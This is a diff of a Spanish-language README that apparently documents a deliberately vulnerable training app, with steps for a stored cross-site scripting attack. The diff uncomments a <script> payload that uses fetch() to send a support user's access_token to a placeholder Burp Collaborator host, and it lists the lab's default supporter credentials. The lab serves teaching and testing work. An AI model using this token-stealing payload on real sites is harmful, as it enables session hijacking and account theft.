@@ -18,7 +18,7 @@ La aplicación se encontrará corriendo en:
 
 *Paso 1)* Con el usuario sin autenticar, enviar la siguiente consulta habiendo abierto el Burp Suite Collaborator para obtener un subdominio burpcollaborator.net y recibir las credenciales en dicho colaborador.
 
-/*:
+
     <script> 
 
         fetch('https://TU-SUBDOMINIO-ACA.burpcollaborator.net', { 
@@ -32,7 +32,6 @@ La aplicación se encontrará corriendo en:
         }); 
 
     </script>
-*/
 
 *Paso 2)* Ingresar con el usuario supporter para que ejecute ese script y le envie al colaborador su access_token. El usuario supporter existe por defecto: usuario: supporter, contraseña: supporter123
 
